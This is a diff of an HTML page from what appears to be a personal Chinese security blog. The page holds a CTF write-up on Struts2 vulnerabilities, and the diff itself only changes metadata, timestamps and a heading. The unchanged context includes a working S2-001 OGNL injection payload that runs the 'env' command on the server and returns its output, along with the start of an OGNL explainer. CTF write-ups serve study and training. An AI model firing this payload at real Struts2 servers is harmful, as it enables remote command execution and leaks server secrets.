@@ -6,12 +6,12 @@
   <meta name="keywords" content=" java ">
   <meta name="description" content="struts2 | C6jU3のblog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="欢迎交流刚入坑的萌新，本站所写仅表示个人拙见，如有不当多多担待 联系方式 QQ：417148909 邮箱：&amp;#99;&amp;#103;&amp;#106;&amp;#x75;&amp;#x65;&amp;#56;&amp;#55;&amp;#49;&amp;#x40;&amp;#x31;&amp;#x36;&amp;#x33;&amp;#46;&amp;#99;&amp;#x6f;&amp;#x6d;">
+<meta name="description" content="欢迎交流刚入坑的萌新，本站所写仅表示个人拙见，如有不当多多担待 联系方式 QQ：417148909 邮箱：&amp;#99;&amp;#103;&amp;#x6a;&amp;#x75;&amp;#x65;&amp;#56;&amp;#x37;&amp;#x31;&amp;#x40;&amp;#x31;&amp;#54;&amp;#51;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#x6d;">
 <meta property="og:type" content="website">
 <meta property="og:title" content="关于">
 <meta property="og:url" content="https://blog.cgjue.cn/about/index.html">
 <meta property="og:site_name" content="C6jU3のblog">
-<meta property="og:description" content="欢迎交流刚入坑的萌新，本站所写仅表示个人拙见，如有不当多多担待 联系方式 QQ：417148909 邮箱：&amp;#99;&amp;#103;&amp;#106;&amp;#x75;&amp;#x65;&amp;#56;&amp;#55;&amp;#49;&amp;#x40;&amp;#x31;&amp;#x36;&amp;#x33;&amp;#46;&amp;#99;&amp;#x6f;&amp;#x6d;">
+<meta property="og:description" content="欢迎交流刚入坑的萌新，本站所写仅表示个人拙见，如有不当多多担待 联系方式 QQ：417148909 邮箱：&amp;#99;&amp;#103;&amp;#x6a;&amp;#x75;&amp;#x65;&amp;#56;&amp;#x37;&amp;#x31;&amp;#x40;&amp;#x31;&amp;#54;&amp;#51;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#x6d;">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-07-16T12:58:30.000Z">
 <meta property="article:modified_time" content="2024-03-05T11:50:05.184Z">
@@ -567,7 +567,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="30">
-<input type="hidden" id="yelog_site_word_count" value="53.6k">
+<input type="hidden" id="yelog_site_word_count" value="54.2k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -1002,7 +1002,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-03-07 18:54:10'>2023-11-03 18:36</time>
+            发布时间 : <time class="date" title='最后更新: 2024-03-15 21:44:32'>2023-11-03 18:36</time>
         
     </div>
     <div class="article-meta">
@@ -1042,7 +1042,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><p>给了个登录框，提示<code>echo FLAG</code>,这是个struts2漏洞</p>
+        <h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><p><strong>S2-001</strong></p>
+<p>给了个登录框，提示<code>echo FLAG</code>,点击发现S2-001，搜索</p>
 <p>payload（解析问题，请忽略反引号</p>
 <pre><code class="java">`%&#123;`#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;
 </code></pre>
@@ -1133,7 +1134,7 @@
         &#125;
 </code></pre>
 <p>这个时候就会输出结果</p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h3 id="ognl表达式"><a href="#ognl表达式" class="headerlink" title="ognl表达式"></a>ognl表达式</h3><p>OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression  Language，简称为  EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL 三要素：(以下部分摘抄互联网某处, 我觉得说得好)</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h3 id="ognl表达式"><a href="#ognl表达式" class="headerlink" title="ognl表达式"></a>ognl表达式</h3><p>OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression  Language，简称为  EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL 三要素：</p>
 <ol>
 <li><p>表达式（Expression）</p>
 <p>表达式是整个 OGNL 的核心，所有的 OGNL 操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL  操作到底要干什么。我们可以看到，在上面的测试中，name、department.name 等都是表达式，表示取 name 或者  department 中的 name 的值。OGNL 支持很多类型的表达式，之后我们会看到更多</p>
